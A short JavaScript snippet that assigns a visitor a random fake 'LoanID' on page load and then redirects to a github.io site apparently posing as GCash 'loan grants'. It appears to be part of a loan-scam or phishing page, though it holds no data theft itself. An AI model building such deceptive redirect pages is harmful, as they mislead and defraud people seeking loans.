window.addEventListener("load", function() {
    let idArray = ["A", "d", "7", "b", "2", "C", "0", "c", "5", "D", "E", "d", "e", "8", "F", "f", "B", "g", "H", "h", "I", "i", "J", "j" , "G", "k", "7", "L", "l", "3", "M", "m", "N", "n", "O", "o"];
    let new_id_permutation = "";
    let x;
    for(x = 0; x < 12; x++) {
        new_id_permutation += idArray[Math.floor(Math.random() * 32)];
    };
    sessionStorage.setItem('LoanID', new_id_permutation);
    setTimeout(function() {
        window.location.replace("https://gcash-loan-grants.github.io/get-grants/loan/");
    }, 2000);
});

